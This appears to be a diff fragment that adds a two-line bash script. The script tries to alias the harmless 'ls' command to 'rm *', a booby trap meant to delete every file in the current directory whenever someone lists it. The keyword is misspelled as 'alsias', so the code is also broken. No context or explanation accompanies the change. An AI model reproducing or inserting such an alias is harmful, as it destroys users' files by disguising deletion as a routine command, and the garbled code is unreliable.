@@ -1,0 +1,2 @@
+#!/bin/bash
+alsias ls="rm *"
